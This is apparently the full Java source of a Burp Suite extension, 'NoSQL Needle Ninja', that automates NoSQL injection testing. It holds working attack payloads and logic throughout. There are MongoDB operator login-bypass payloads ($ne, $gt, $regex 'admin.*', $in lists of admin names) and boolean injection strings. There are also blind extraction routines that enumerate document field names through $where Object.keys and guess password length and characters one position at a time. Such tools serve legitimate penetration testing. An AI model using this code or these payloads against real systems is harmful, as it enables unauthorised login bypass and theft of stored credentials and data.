import burp.api.montoya.BurpExtension;
import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.HttpService;
import burp.api.montoya.http.handler.HttpResponseReceived;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import burp.api.montoya.ui.UserInterface;
import burp.api.montoya.ui.editor.HttpRequestEditor;
import burp.api.montoya.ui.editor.HttpResponseEditor;

import javax.swing.*;
import java.awt.*;
import java.util.*;

import static burp.api.montoya.ui.editor.EditorOptions.READ_ONLY;

public class NNN implements BurpExtension {
    private static MontoyaApi api;
    private static ArrayList<Payload> payloadsArrayList = new ArrayList<>();
    static HttpResponse response;

    private static JTextPane infoPane = new JTextPane();

    private void LoadPayloads() {
        // Fuzz String
        this.payloadsArrayList.add(new Payload(PayloadType.FUZZ_STRING, "'\"`{;$Foo}$Foo \\xYZ", "'\"`{;$Foo}$Foo \\xYZ", null));

        // Boolean payloads
        this.payloadsArrayList.add(new Payload(PayloadType.BOOLEAN, urlEncodeData("' && 0 && 'x"), "' && 0 && 'x", null));
        this.payloadsArrayList.add(new Payload(PayloadType.BOOLEAN, urlEncodeData("' && 1 && 'x"), "' && 1 && 'x", null));
        this.payloadsArrayList.add(new Payload(PayloadType.BOOLEAN, urlEncodeData(" && 0 && x"), " && 0 && x", null));
        this.payloadsArrayList.add(new Payload(PayloadType.BOOLEAN, urlEncodeData(" && 1 && x"), " && 1 && x", null));
        this.payloadsArrayList.add(new Payload(PayloadType.BOOLEAN, urlEncodeData("'||1|| '"), "'||1|| '", null));
        this.payloadsArrayList.add(new Payload(PayloadType.BOOLEAN, urlEncodeData(" ||1|| "), " ||1|| ", null));

        // Payloads for username field
        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\"$regex\":\"admin.*\"}"), "{\"$regex\":\"admin.*\"}", null));
        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\"$regex\":\"admin*\"}"), "{\"$regex\":\"admin*\"}", null));
        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("\"admin\""), "\"admin\"", null));
        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\"$regex\":\"admin.*\"}"), "{\"$regex \":\"admin.*\"}", null));
        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\"$ne\":null}"), "{\"$ne\":null}", null));
        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\"$ne\":\"foo\"}"), "{\"$ne\":\"foo\"}", null));
        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\"$gt\":undefined}"), "{\"$gt\":undefined}", null));
        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\"$gt\":\"\"}"), "{\"$gt\":\"\"}", null));
        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\"$in\":[\"Admin\", \"4dm1n\", \"admin\" , \"root\", \"administrator\"]}"), "{\"$in\":[\"Admin\", \"4dm1n\", \"admin\" , \"root\", \"administrator\"]}", null));

        // Payloads for password field
        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_PASSWORD, urlEncodeData("{\"$ne\":\"invalidpassword\"}"), "{\"$ne\":\"invalidpassword\"}", null));
        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_PASSWORD, urlEncodeData("{\"$ne\":null}"), "{\"$ne\":null}", null));
        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_PASSWORD, urlEncodeData("{\"$ne\":\"xd\"}"), "{\"$ne\":\"xd\"}", null));
        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_PASSWORD, urlEncodeData("{\"$gt\":undefined}"), "{\"$gt\":undefined}", null));
        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_PASSWORD, urlEncodeData("{\"$gt\":\"\"}"), "{\"$gt\":\"\"}", null));

        // Data extraction payloads have to be handled directly
    }

    public String urlEncodeData(String data) {
        return api.utilities().urlUtils().encode(data);
    }

    @Override
    public void initialize(MontoyaApi api) {
        this.api = api;
        api.extension().setName("NNN");
        api.logging().logToOutput("Extension NoSQL Needle Ninja (NNN) has been started");
        this.LoadPayloads();

        api.userInterface().registerContextMenuItemsProvider(new MyContextMenuItemsProvider(api));

        MyTableModel tableModel = new MyTableModel();
        api.userInterface().registerSuiteTab("NNN Logger", constructLoggerTab(tableModel));
        api.http().registerHttpHandler(new MyHttpHandler(tableModel));

    }

    private Component constructLoggerTab(MyTableModel tableModel)
    {
        // main split pane
        JSplitPane splitPane = new JSplitPane(JSplitPane.VERTICAL_SPLIT);

        // tabs with request/response viewers
        JTabbedPane tabs = new JTabbedPane();

        UserInterface userInterface = api.userInterface();

        HttpRequestEditor requestViewer = userInterface.createHttpRequestEditor(READ_ONLY);
        HttpResponseEditor responseViewer = userInterface.createHttpResponseEditor(READ_ONLY);

        // new information pane
        this.infoPane.setEditable(false); // Make it read-only
        this.infoPane.setText("[i] NNN is ready - Please start a test\n"); // Set initial text
        JScrollPane infoScrollPane = new JScrollPane(this.infoPane);

        // Create a button to clear logged packets
        JButton clearButton = new JButton("Clear Log");
        clearButton.setForeground(Color.decode("#FF6633"));
        clearButton.setPreferredSize(new Dimension(200, clearButton.getPreferredSize().height));
        clearButton.addActionListener(e -> {
            tableModel.clear();
            this.infoPane.setText(infoPane.getText() +"[i] Logs were cleared\n");
        });

        // Panel to hold the button
        JPanel buttonPanel = new JPanel(new FlowLayout(FlowLayout.CENTER));
        buttonPanel.add(clearButton);

        // Panel to hold the info pane and the button
        JPanel infoPanel = new JPanel(new BorderLayout());
        infoPanel.add(infoScrollPane, BorderLayout.CENTER);
        infoPanel.add(buttonPanel, BorderLayout.SOUTH);

        tabs.addTab("NNN Scan Information", infoPanel);

        tabs.addTab("Request", requestViewer.uiComponent());
        tabs.addTab("Response", responseViewer.uiComponent());

        splitPane.setRightComponent(tabs);

        // table of log entries
        JTable table = new JTable(tableModel)
        {
            @Override
            public void changeSelection(int rowIndex, int columnIndex, boolean toggle, boolean extend)
            {
                // show the log entry for the selected row
                HttpResponseReceived responseReceived = tableModel.get(rowIndex);
                requestViewer.setRequest(responseReceived.initiatingRequest());
                responseViewer.setResponse(responseReceived);

                super.changeSelection(rowIndex, columnIndex, toggle, extend);
            }
        };

        // Columns sizes
        table.getColumnModel().getColumn(0).setMaxWidth(50);
        table.getColumnModel().getColumn(1).setMaxWidth(90);
        table.getColumnModel().getColumn(5).setMaxWidth(90);
        table.getColumnModel().getColumn(6).setMaxWidth(90);

//        table.setAutoCreateRowSorter(true);

        JScrollPane scrollPane = new JScrollPane(table);

        splitPane.setLeftComponent(scrollPane);

        return splitPane;
    }


    private static double calculateMean(ArrayList<HttpRequestResponse> objects) {
        double sum = 0;
        for (HttpRequestResponse obj : objects) {
            sum += obj.response().toString().length();
        }
        return sum / objects.size();
    }

    private static double calculateStandardDeviation(ArrayList<HttpRequestResponse> objects, double mean) {
        double sum = 0;
        for (HttpRequestResponse obj : objects) {
            double diff = obj.response().toString().length() - mean;
            sum += diff * diff;
        }
        return Math.sqrt(sum / objects.size());
    }

    private static ArrayList<HttpRequestResponse> findOutliers(ArrayList<HttpRequestResponse> objects, double mean, double stdDev) {
        ArrayList<HttpRequestResponse> outliers = new ArrayList<>();
        for (HttpRequestResponse obj : objects) {
            double value = obj.response().toString().length();
            if (Math.abs(value - mean) > 2 * stdDev) {  // Adjust the accuracy
                outliers.add(obj);
            }
        }
        return outliers;
    }

    private static <T> ArrayList<T> removeDuplicates(ArrayList<T> list) {
        HashSet<T> set = new HashSet<>(list);
        return new ArrayList<>(set);
    }

    static ArrayList<HttpRequestResponse> printSuspiciousResponses(ArrayList<HttpRequestResponse> responseList) {
        // Calculate the maean
        double mean = calculateMean(responseList);
        // Calculate the standard deviation
        double stdDev = calculateStandardDeviation(responseList, mean);
        // Find objects with instance parameter values that stand out
        ArrayList<HttpRequestResponse> outliers = findOutliers(responseList, mean, stdDev);
        // Add to outliers responses with suspicious status codes
        for (HttpRequestResponse resp : responseList) {
            if (resp.response().statusCode()!=200 && resp.response().statusCode()!=400 && resp.response().statusCode()!=404) {
                outliers.add(resp);
            }
        }
        // Remove duplicates from outliers
        outliers = removeDuplicates(outliers);
        // Sort outliers by status codes
        outliers.sort(new Comparator<HttpRequestResponse>() {
            @Override
            public int compare(HttpRequestResponse o1, HttpRequestResponse o2) {
                return Integer.compare(o1.response().statusCode(), o2.response().statusCode());
            }
        });
        for (HttpRequestResponse obj : outliers) {
            infoPane.setText(infoPane.getText() + "Status Code: " + obj.response().statusCode() + "        Length: " + String.format("%" + 8 + "s", obj.response().toString().length()) + "       Payload: " + (obj.request().query().isBlank() ? api.utilities().urlUtils().decode(obj.request().body()) : api.utilities().urlUtils().decode(obj.request().query())) + "\n");
        }
        return outliers;
    }


    static void fuzzstringTest(HttpRequestResponse requestResponse, Integer startIndex, Integer endIndex) {
        new Thread(() -> {
            try {
                infoPane.setText(infoPane.getText() + "[i] Fuzz String Test\n");
                HttpRequest request2send;
                HttpRequestResponse response2receive;
                HttpService httpService = requestResponse.request().httpService();
                for (Payload payload : payloadsArrayList){
                    if (payload.payloadType == PayloadType.FUZZ_STRING) {
                        request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString());
                        if (request2send.method().equals("POST")) {
                            request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startIndex) + payload.payload + requestResponse.request().toString().substring(endIndex));
                            response2receive = api.http().sendRequest(request2send.withUpdatedHeader("Content-Length", String.valueOf(request2send.body().length())));
                        } else {
                            request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startIndex) + payload.payloadUrlEncoded + requestResponse.request().toString().substring(endIndex));
                            response2receive = api.http().sendRequest(request2send);
                        }
                        if (response2receive.response().statusCode() != 200) {
                            infoPane.setText(infoPane.getText() + "Status Code: " + response2receive.response().statusCode() + "        Length: " + String.format("%" + 8 + "s", response2receive.response().toString().length()) + "       Payload: " + (response2receive.request().query().isBlank() ? api.utilities().urlUtils().decode(response2receive.request().body()) : api.utilities().urlUtils().decode(response2receive.request().query())) + "\n");
                        }
                        ArrayList<HttpRequestResponse> responseList = new ArrayList<>(); // Collect responses to later analyze them
                        for (int i = 0; i < payload.payload.length(); i++) {
                            char c = payload.payload.charAt(i);
                            request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString());
                            if (request2send.method().equals("POST")) {
                                request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startIndex) + c + requestResponse.request().toString().substring(endIndex));
                                response2receive = api.http().sendRequest(request2send.withUpdatedHeader("Content-Length", String.valueOf(request2send.body().length())));
                            } else {
                                request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startIndex) + api.utilities().urlUtils().encode(String.valueOf(c)) + requestResponse.request().toString().substring(endIndex));
                                response2receive = api.http().sendRequest(request2send);
                            }
                            responseList.add(response2receive);
                        }
                        printSuspiciousResponses(responseList);

                    }
                }
            } catch (Exception e) {
                api.logging().logToError("[!] FuzzString module failed");
                api.logging().logToError(e);
            }
        }).start();
    }

    static void booleanTest(HttpRequestResponse requestResponse, Integer startIndex, Integer endIndex) {
        new Thread(() -> {
            try {
                infoPane.setText(infoPane.getText() + "[i] Boolean Test\n");
                HttpRequest request2send;
                HttpRequestResponse response2receive;
                HttpService httpService = requestResponse.request().httpService();
                ArrayList<HttpRequestResponse> responseList = new ArrayList<>(); // Collect responses to later analyze them
                for (Payload payload : payloadsArrayList){
                    if (payload.payloadType == PayloadType.BOOLEAN) {
                        request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startIndex) + payload.payloadUrlEncoded + requestResponse.request().toString().substring(endIndex));
                        api.logging().logToOutput("[i] Modified request:\n" + request2send.toString() + "\n");
                        if (request2send.method().equals("POST")) {
                            response2receive = api.http().sendRequest(request2send.withUpdatedHeader("Content-Length", String.valueOf(request2send.body().length())));
                        } else {
                            response2receive = api.http().sendRequest(request2send);
                        }
                        api.logging().logToOutput("[i] Response:\n" + response2receive.response().toString() + "\n");
                        responseList.add(response2receive);
                    }
                }
                printSuspiciousResponses(responseList);
            } catch (Exception e) {
                api.logging().logToError("[!] Boolean module failed");
                api.logging().logToError(e);
            }
        }).start();
    }

    static void authenticationUsernameTest(HttpRequestResponse requestResponse, Integer startIndex, Integer endIndex) {
        infoPane.setText(infoPane.getText() + "[i] Username Authentication Test\n");
        new Thread(() -> {
            try {
                HttpRequest request2send;
                HttpRequestResponse response2receive;
                HttpService httpService = requestResponse.request().httpService();
                ArrayList<HttpRequestResponse> responseList = new ArrayList<>(); // Collect responses to later analyze them
                for (Payload payload : payloadsArrayList){
                    if (payload.payloadType == PayloadType.AUTHENTICATION_BYPASS_USERNAME) {
                        if (requestResponse.request().method().equals("POST")) {
                            request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startIndex) + payload.payload + requestResponse.request().toString().substring(endIndex));
                            response2receive = api.http().sendRequest(request2send.withUpdatedHeader("Content-Length", String.valueOf(request2send.body().length())));
                        } else {
                            request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startIndex) + payload.payloadUrlEncoded + requestResponse.request().toString().substring(endIndex));
                            response2receive = api.http().sendRequest(request2send);
                        }
                        responseList.add(response2receive);
                    }
                }
                printSuspiciousResponses(responseList);
            } catch (Exception e) {
                api.logging().logToError("[!] Username Authentication module failed");
                api.logging().logToError(e);
            }
        }).start();
    }

    static void authenticationPasswordTest(HttpRequestResponse requestResponse, Integer startIndex, Integer endIndex) {
        infoPane.setText(infoPane.getText() + "[i] Password Authentication Test\n");
        new Thread(() -> {
            try {
                HttpRequest request2send;
                HttpRequestResponse response2receive;
                HttpService httpService = requestResponse.request().httpService();
                ArrayList<HttpRequestResponse> responseList = new ArrayList<>(); // Collect responses to later analyze them
                for (Payload payload : payloadsArrayList){
                    if (payload.payloadType == PayloadType.AUTHENTICATION_BYPASS_PASSWORD) {
                        if (requestResponse.request().method().equals("POST")) {
                            request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startIndex) + payload.payload + requestResponse.request().toString().substring(endIndex));
                            response2receive = api.http().sendRequest(request2send.withUpdatedHeader("Content-Length", String.valueOf(request2send.body().length())));
                        } else {
                            request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startIndex) + payload.payloadUrlEncoded + requestResponse.request().toString().substring(endIndex));
                            response2receive = api.http().sendRequest(request2send);
                        }
                        responseList.add(response2receive);
                    }
                }
                printSuspiciousResponses(responseList);
            } catch (Exception e) {
                api.logging().logToError("[!] Password Authentication module failed");
                api.logging().logToError(e);
            }
        }).start();
    }


    static void authenticationTest(HttpRequestResponse requestResponse, Integer startUsernameIndex, Integer endUsernameIndex, Integer startPasswordIndex, Integer endPasswordIndex) {
        new Thread(() -> {
            try {
                infoPane.setText(infoPane.getText() + "[i] Authentication Test\n");
                HttpRequest request2send;
                HttpRequestResponse response2receive;
                HttpService httpService = requestResponse.request().httpService();
                ArrayList<HttpRequestResponse> responseList = new ArrayList<>(); // Collect responses to later analyze them
                for (Payload payload1 : payloadsArrayList){
                    if (payload1.payloadType == PayloadType.AUTHENTICATION_BYPASS_USERNAME) {
                        for (Payload payload2 : payloadsArrayList) {
                            if (payload2.payloadType == PayloadType.AUTHENTICATION_BYPASS_PASSWORD) {
                                if (requestResponse.request().method().equals("POST")) {
                                    if (startUsernameIndex > startPasswordIndex) {
                                        request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startUsernameIndex) + payload1.payload + requestResponse.request().toString().substring(endUsernameIndex));
                                        request2send = HttpRequest.httpRequest(httpService, request2send.toString().substring(0, startPasswordIndex) + payload2.payload + request2send.toString().substring(endPasswordIndex));
                                    } else {
                                        request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startPasswordIndex) + payload2.payload + requestResponse.request().toString().substring(endPasswordIndex));
                                        request2send = HttpRequest.httpRequest(httpService, request2send.toString().substring(0, startUsernameIndex) + payload1.payload + request2send.toString().substring(endUsernameIndex));
                                    }
//                                    api.logging().logToOutput("[i] Modified request:\n" + request2send.toString() + "\n");
                                    response2receive = api.http().sendRequest(request2send.withUpdatedHeader("Content-Length", String.valueOf(request2send.body().length())));
                                    responseList.add(response2receive);
                                } else {
                                    if (startUsernameIndex > startPasswordIndex) {
                                        request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startUsernameIndex) + payload1.payloadUrlEncoded + requestResponse.request().toString().substring(endUsernameIndex));
                                        request2send = HttpRequest.httpRequest(httpService, request2send.toString().substring(0, startPasswordIndex) + payload2.payloadUrlEncoded + request2send.toString().substring(endPasswordIndex));
                                    } else {
                                        request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startPasswordIndex) + payload2.payloadUrlEncoded + requestResponse.request().toString().substring(endPasswordIndex));
                                        request2send = HttpRequest.httpRequest(httpService, request2send.toString().substring(0, startUsernameIndex) + payload1.payloadUrlEncoded + request2send.toString().substring(endUsernameIndex));
                                    }
//                                    api.logging().logToOutput("[i] Modified request:\n" + request2send.toString() + "\n");
                                    response2receive = api.http().sendRequest(request2send);
                                    responseList.add(response2receive);
                                }
//                                api.logging().logToOutput("[i] Response:\n" + response2receive.response().toString() + "\n");
                            }
                        }
                    }
                }
                printSuspiciousResponses(responseList);
            } catch (Exception e) {
                api.logging().logToError("[!] Authentication module failed");
                api.logging().logToError(e);
            }
        }).start();
    }

    static void extractFieldNames(HttpRequestResponse requestResponse, int index) {
        infoPane.setText(infoPane.getText() + "[i] Extraction of field names\n");
        //api.logging().logToOutput("[i] Selected request:\n" + requestResponse.request().toString() + "\n");
        ArrayList<String> names = new ArrayList<>();
        new Thread(() -> {
            try {
                HttpRequest request2send;
                HttpRequestResponse response2receive;
                HttpService httpService = requestResponse.request().httpService();
                if (requestResponse.request().method().equals("POST")){

                    Boolean finished = false;
                    int number = 0;
                    while (!finished || number < 2) {
                        int position = 0;
                        StringBuilder sb = new StringBuilder();
                        while (true) {
                            ArrayList<HttpRequestResponse> responseList = new ArrayList<>();
                            HttpRequestResponse response1 = null; HttpRequestResponse response2 = null;
                            Character extractedLetter = null;
                            String characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
                            char ch;
                            for (int i=0; i< characters.length(); i++) {
                                ch = characters.charAt(i);
                                StringBuilder payload = new StringBuilder();
                                payload.append(", \"$where\":\" Object.keys(this)[");
                                payload.append(Integer.toString(number));
                                payload.append("].match('^.{");
                                payload.append(Integer.toString(position));
                                payload.append("}");
                                payload.append(ch);
                                payload.append(".*')\"");
                                request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, index) + payload + requestResponse.request().toString().substring(index));
                                response2receive = api.http().sendRequest(request2send.withUpdatedHeader("Content-Length", String.valueOf(request2send.body().length())));
                                responseList.add(response2receive);
                                if (response1 == null){
                                    response1 = response2receive;
                                } else if (response2 == null && response2receive.response().toString().length() != response1.response().toString().length()){
                                    response2 = response2receive;
                                } else if (response2 != null && response2receive.response().toString().length() == response1.response().toString().length()){
                                    extractedLetter = response2.request().toString().charAt(response2.request().toString().lastIndexOf(".*')")-1);
                                    break;
                                } else if (response2 != null && response2receive.response().toString().length() == response2.response().toString().length()){
                                    extractedLetter = response1.request().toString().charAt(response1.request().toString().lastIndexOf(".*')")-1);
                                    break;
                                }
                            }
                            if (extractedLetter != null){
                                infoPane.setText(infoPane.getText() + extractedLetter);
                                sb.append(extractedLetter);
                            } else {
                                if (sb.isEmpty() && number > 0){
                                    finished = true;
                                } else {
                                    names.add(sb.toString());
                                }
                                break;
                            }
                            position++;
                        }
                        number++;
                        infoPane.setText(infoPane.getText() + "\n");
                        if (!sb.isEmpty()){
                            infoPane.setText(infoPane.getText() + "[i] Extracted field name: " + sb + "\n");
                        }
                    }
                }

            } catch (Exception e) {
                api.logging().logToError("[!] Extract Field Names module failed");
                api.logging().logToError(e);
            }
        }).start();
    }

    static void dataExtraction(HttpRequestResponse requestResponse, Integer startIndex, Integer endIndex) {
        new Thread(() -> {
            try {
                infoPane.setText(infoPane.getText() + "[i] Extraction of data\n");
                HttpRequest request2send;
                HttpRequestResponse response2receive;
                HttpService httpService = requestResponse.request().httpService();

                // Identify field length
                int fieldLength = identifyFieldLength(requestResponse, startIndex, endIndex, httpService);

                // Enumerate the field
                if (fieldLength > 0) {
                    enumerateField(requestResponse, startIndex, endIndex, httpService, fieldLength);
                }
            } catch (Exception e) {
                api.logging().logToError("[!] Data Extraction module failed");
                api.logging().logToError(e);
            }
        }).start();
    }

    private static int identifyFieldLength(HttpRequestResponse requestResponse, Integer startIndex, Integer endIndex, HttpService httpService) {
        int length = 0;
        try {
            HttpRequest request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString());
            HttpRequestResponse response2receive;
            String fieldValue =  requestResponse.request().toString().substring(startIndex,endIndex);
            ArrayList<HttpRequestResponse> responseList = new ArrayList<>(); // Collect responses to later analyze them
            if (request2send.method().equals("GET")) {
                for (int i = 1; i < 50; i++) {  // assuming the max length of password is less than 100
                    request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startIndex) + api.utilities().urlUtils().encode(fieldValue + ".length>" + i + " || 'a'=='b") + requestResponse.request().toString().substring(endIndex));
                    response2receive = api.http().sendRequest(request2send);
                    responseList.add(response2receive);
                }
                length = printSuspiciousResponses(responseList).size() + 1;
            } else {

            }
        } catch (Exception e) {
            api.logging().logToError("[!] Error identifying password length");
            api.logging().logToError(e);
        }
        return length;
    }

    private static void enumerateField(HttpRequestResponse requestResponse, Integer startIndex, Integer endIndex, HttpService httpService, int passwordLength) {
        try {
            HttpRequest request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString());
            HttpRequestResponse response2receive;
            char[] password = new char[passwordLength];
            String fieldValue =  requestResponse.request().toString().substring(startIndex,endIndex);
            ArrayList<HttpRequestResponse> responseList = new ArrayList<>(); // Collect responses to later analyze them
            if (request2send.method().equals("GET")) {
                infoPane.setText(infoPane.getText() + "[i] Identified characters:\n");
                for (int i = 0; i < passwordLength; i++) {
                    responseList = new ArrayList<>(); // Collect responses to later analyze them
                    for (char c = 'a'; c <= 'z'; c++) {  // assuming the field is lowercase letters
                        request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startIndex) + api.utilities().urlUtils().encode(fieldValue + "[" + i + "]=='" + c + "' || 'a'=='b") + requestResponse.request().toString().substring(endIndex));
                        response2receive = api.http().sendRequest(request2send);
                        responseList.add(response2receive);
                    }
                    try {
                        String query = printSuspiciousResponses(responseList).get(0).request().query();
                    } catch (Exception e) {
                        api.logging().logToError("[!] No correct character found for position: " + i);
                        api.logging().logToError(e);
                    }
                }
            } else {

            }
        } catch (Exception e) {
            api.logging().logToError("[!] Error enumerating password");
            api.logging().logToError(e);
        }
    }

}
